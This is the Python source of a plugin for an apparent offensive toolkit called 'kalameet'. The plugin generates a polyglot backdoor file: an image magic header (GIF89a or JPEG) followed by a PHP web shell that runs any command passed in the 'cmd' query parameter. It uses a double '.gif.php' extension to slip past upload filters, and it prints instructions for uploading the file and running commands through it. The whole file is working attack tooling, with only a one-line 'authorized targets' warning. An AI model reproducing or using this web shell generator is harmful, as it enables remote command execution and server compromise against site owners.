from kalameet.core.base import BasePlugin
from kalameet.core.interface import Colors

class BackdoorPlugin(BasePlugin):
    meta = {
        'name': 'backdoor',
        'description': 'Create Polyglot Web Shell (Image + PHP)',
        'author': 'Kalameet'
    }

    def add_arguments(self, parser):
        parser.add_argument("--type", choices=['jpg', 'gif'], default='gif', help="Image Type")
        parser.add_argument("--out", default="shell", help="Output filename (without extension)")

    def run(self, args):
        print(f"{Colors.BLUE}[*] Crafting Polyglot Backdoor...{Colors.ENDC}")
        
        # Magic Bytes untuk menipu server agar mengira ini gambar
        # GIF89a adalah header GIF yang valid
        magic_header = b"GIF89a;\n" if args.type == 'gif' else b"\xff\xd8\xff\xe0\n"
        
        # Payload PHP Sederhana (Web Shell)
        # <?php system($_GET['cmd']); ?>
        payload = b"<?php system($_GET['cmd']); die(); ?>"
        
        filename = f"{args.out}.{args.type}.php" # Double extension trick
        
        try:
            with open(filename, 'wb') as f:
                f.write(magic_header + payload)
            
            print(f"{Colors.GREEN}[+] Backdoor Created: {filename}{Colors.ENDC}")
            print(f"{Colors.INFO}[i] Upload this file, then access: {filename}?cmd=id{Colors.ENDC}")
            print(f"{Colors.WARNING}[!] Warning: Use only on authorized targets!{Colors.ENDC}")
            
        except Exception as e:
            print(f"[-] Error: {e}")